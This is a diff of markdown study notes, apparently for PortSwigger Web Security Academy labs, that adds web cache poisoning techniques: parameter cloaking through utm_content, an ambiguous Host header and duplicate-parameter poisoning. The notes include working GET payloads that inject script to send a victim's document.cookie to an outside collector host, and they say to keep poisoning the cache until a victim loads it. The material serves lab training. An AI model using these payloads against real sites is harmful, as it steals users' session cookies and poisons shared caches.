@@ -741,7 +741,8 @@ body:document.cookie
 ## Web Cache Poison  
 
 [Unkeyed header](#unkeyed-header)  
-[Utm_content](#utm_content)  
+[Unkeyed Utm_content](#unkeyed-utm_content)  
+[Cloaking utm_content](#cloaking-utm_content)  
 [Poison ambiguous request](#poison-ambiguous-request)  
 [Cache Poison multiple headers](#cache-poison-multiple-headers)  
 
@@ -785,7 +786,7 @@ document.location='https://collaboration.net/?cookies='+document.cookie;
   
 [Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
   
-### utm_content  
+### Unkeyed utm_content  
 
 >Target is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. Param Miner's "Guess GET parameters" feature will ***identify*** the parameter as utm_content.  
 
@@ -801,6 +802,33 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 
 [PortSwigger Lab: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)  
 
+### Cloaking utm_content  
+
+>Param Miner extension doing a `Bulk scan > Rails parameter cloaking scan` will ***identify*** the vulnerability automatically. Manually it can be identified by adding `;` to append another parameter to `utm_content`, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key.  
+>The `source code` for `/js/geolocate.js?callback=setCountryCookie` is called on every page and execute callback function.  
+
+>The `callback` parameter is keyed, and thus cannot poison cache for victim user, but by combine duplicate parameter with `utm_content` it then excluded and cache can be poisoned.  
+
+```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=EVILFunction
+```  
+
+![utm_content_cloaking.png](images]utm_content_cloaking.png)  
+
+>Cache Cloaking Cookie Capturing payload below, keep poising cache until victim hits stored cache.  
+
+```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://5ciaan3qrdgpqf1fxsjxtid5lwrnff34.oastify.com?nuts='%2bdocument.cookie%3b HTTP/2
+```  
+
+>Below is [Url Decoded](https://www.urldecoder.org/) payload.  
+
+```
+GET/js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://5ciaan3qrdgpqf1fxsjxtid5lwrnff34.oastify.com?nuts='+document.cookie; HTTP/2
+```  
+
+[PortSwigger Lab: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)  
+  
 ### Poison ambiguous request  
 
 >Adding a second **Host** header with an exploit server, this ***identify*** a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
@@ -844,6 +872,22 @@ document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 >Remove the ```cb=123``` cache **buster**, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.  
 
 [PortSwigger Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)  
+
+### Duplicate Parameter Fat Poison  
+
+>Identify that the application is vulnerable to duplicate parameter poisoning, by adding a second parameter with same name and different value the response reflected the injected value.  
+
+![countrycode source code](images/countrycode-source-code.png)  
+
+```
+GET /js/geolocate.js?callback=setCountryCookie&callback=arbitraryFunction HTTP/2
+```  
+
+>The function that is called in the response by passing in a duplicate callback parameter is reflected. Notice in response the cache key is still derived from the original callback parameter in the GET request line.  
+
+![fat-get-request](images/fat-get-request.png)  
+
+[PortSwigger ](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)  
   
 -----
 
